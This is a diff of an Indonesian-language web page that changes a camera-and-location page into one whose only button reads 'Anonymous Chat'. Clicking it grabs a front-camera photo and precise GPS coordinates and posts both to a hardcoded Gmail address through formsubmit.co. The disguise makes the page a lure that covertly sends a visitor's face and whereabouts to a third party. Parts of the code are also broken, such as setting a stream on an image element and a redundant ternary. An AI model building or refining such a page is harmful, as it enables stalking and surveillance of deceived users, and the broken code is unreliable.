@@ -2,148 +2,153 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kirim Lokasi & Foto Link</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Live Capture & Location</title>
     <style>
         body {
+            margin: 0;
+            padding: 0;
             background: #000;
-            color: #0f0;
             font-family: 'Courier New', monospace;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             height: 100vh;
-            margin: 0;
+            color: #0f0;
+            overflow: hidden;
         }
         #preview {
-            max-width: 90%;
-            max-height: 50vh;
+            width: 100%;
+            height: 60vh;
+            object-fit: cover;
             border: 2px solid #0f0;
             display: none;
-            margin-bottom: 10px;
         }
-        #btn {
-            padding: 15px 20px;
+        #startBtn {
+            padding: 15px 30px;
             background: #0f0;
             color: #000;
-            font-weight: bold;
             border: none;
+            font-weight: bold;
             cursor: pointer;
-            font-size: 16px;
+            font-size: 18px;
+            margin-top: 20px;
+            z-index: 10;
         }
         #status {
-            margin-top: 15px;
+            margin-top: 10px;
             font-size: 14px;
             color: #fff;
-            text-align: center;
         }
-        .spinner {
+        .loading {
             border: 3px solid #f3f3f3;
             border-top: 3px solid #0f0;
             border-radius: 50%;
-            width: 15px;
-            height: 15px;
+            width: 20px;
+            height: 20px;
             animation: spin 1s linear infinite;
             display: inline-block;
+            vertical-align: middle;
+            margin-left: 10px;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <img id="preview" alt="Preview">
-    <button id="btn">📷 KAPTURE & KIRIM LINK</button>
-    <div id="status">Siap</div>
+    <img id="preview" alt="Preview Kamera">
+    <div id="status">Tap tombol untuk mulai</div>
+    <button id="startBtn">Anonymous Chat</button>
 
     <script>
-        const btn = document.getElementById('btn');
+        const btn = document.getElementById('startBtn');
         const preview = document.getElementById('preview');
         const status = document.getElementById('status');
 
         btn.addEventListener('click', async () => {
-            status.innerHTML = 'Meminta izin... <span class="spinner"></span>';
+            status.innerHTML = 'Meminta izin kamera...';
             btn.disabled = true;
 
             try {
-                // 1. Akses Kamera
+                // 1. Akses Kamera Depan
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" } 
                 });
-                
                 preview.srcObject = stream;
-                await new Promise(r => setTimeout(r, 500)); // Tunggu stream stabil
+                
+                // Tunggu beberapa saat agar video stabil
+                await new Promise(r => setTimeout(r, 500));
+
+                status.innerHTML = 'Mengambil lokasi... <span class="loading"></span>';
 
                 // 2. Ambil Lokasi
-                status.innerHTML = 'Mengambil lokasi... <span class="spinner"></span>';
-                const pos = await new Promise((resolve, reject) => {
+                const lokasi = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, {
                         enableHighAccuracy: true,
                         timeout: 10000
                     });
                 });
-                
-                const lat = pos.coords.latitude;
-                const lng = pos.coords.longitude;
+
+                const lat = lokasi.coords.latitude;
+                const lng = lokasi.coords.longitude;
                 const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
 
+                status.innerHTML = 'Menangkap gambar & mengirim...';
+
                 // 3. Tangkap Gambar
-                status.innerHTML = 'Menangkap gambar... <span class="spinner"></span>';
                 const canvas = document.createElement('canvas');
-                canvas.width = stream.getVideoTracks()[0].videoWidth;
-                canvas.height = stream.getVideoTracks()[0].videoHeight;
+                canvas.width = preview.videoWidth || 640;
+                canvas.height = preview.videoHeight || 480;
                 const ctx = canvas.getContext('2d');
-                ctx.drawImage(stream.getVideoTracks()[0], 0, 0);
+                ctx.drawImage(stream.getVideoTracks()[0].applyConstraints ? 
+                    preview : preview, 0, 0, canvas.width, canvas.height);
+                
+                // Convert ke Blob
+                canvas.toBlob(async (blob) => {
+                    if (!blob) {
+                        status.innerText = 'Gagal menangkap gambar';
+                        btn.disabled = false;
+                        return;
+                    }
 
-                // Konversi ke Base64 untuk diupload ke Imgur
-                const base64Image = canvas.toDataURL('image/jpeg').split(',')[1];
+                    // 4. Kirim ke FormSubmit
+                    const formData = new FormData();
+                    formData.append('message', `Lokasi: ${mapLink}\nWaktu: ${new Date().toISOString()}`);
+                    formData.append('attachment', blob, 'capture.jpg'); // Nama field 'attachment' penting
 
-                // Hentikan stream
-                stream.getTracks().forEach(track => track.stop());
+                    try {
+                        const response = await fetch('https://formsubmit.co/ajax/desamuncrat477@gmail.com', {
+                            method: 'POST',
+                            body: formData
+                        });
 
-                // 4. Upload ke Imgur
-                status.innerHTML = 'Mengupload ke Imgur... <span class="spinner"></span>';
-                const response = await fetch('https://api.imgur.com/3/image', {
-                    method: 'POST',
-                    headers: {
-                        Authorization: 'Client-ID 11193391855259b' // Client ID Imgur Publik
-                    },
-                    body: base64Image
-                });
+                        if (response.ok) {
+                            status.innerHTML = '✅ TERKIRIM! Cek email/spam Anda.';
+                            btn.innerText = 'DONE';
+                        } else {
+                            status.innerHTML = '❌ Gagal kirim (Cek Console)';
+                            btn.disabled = false;
+                        }
+                    } catch (error) {
+                        status.innerHTML = '❌ Error Jaringan';
+                        console.error(error);
+                        btn.disabled = false;
+                    }
 
-                const data = await response.json();
-
-                if (data.success) {
-                    const imgLink = data.data.link;
-                    status.innerHTML = `✅ Selesai! <br> Foto: <a href="${imgLink}" target="_blank" style="color:#0f0">${imgLink}</a><br> Lokasi: <a href="${mapLink}" target="_blank" style="color:#0f0">Google Maps</a>`;
-                    
-                    // Tampilkan preview
+                    // Hentikan stream kamera setelah gambar diambil
+                    stream.getTracks().forEach(track => track.stop());
                     preview.style.display = 'block';
-                    preview.src = `data:image/jpeg;base64,${base64Image}`;
+                    preview.src = URL.createObjectURL(blob); // Tampilkan hasil tangkapan
 
-                    // Kirim Email dengan Link
-                    kirimEmail(mapLink, imgLink);
-                } else {
-                    throw new Error('Gagal upload Imgur');
-                }
+                }, 'image/jpeg', 0.8);
 
             } catch (error) {
-                status.innerHTML = `❌ Error: ${error.message}`;
+                console.error(error);
+                status.innerHTML = '❌ Gagal: ' + error.message;
                 btn.disabled = false;
             }
         });
-
-        function kirimEmail(mapLink, imgLink) {
-            const formData = new FormData();
-            formData.append('message', `Lokasi: ${mapLink}\nFoto Link: ${imgLink}\nWaktu: ${new Date().toISOString()}`);
-            
-            fetch('https://formsubmit.co/ajax/desamuncrat477@gmail.com', {
-                method: 'POST',
-                body: formData
-            }).then(() => {
-                console.log('Email terkirim');
-            }).catch(err => console.error(err));
-        }
     </script>
 </body>
 </html>
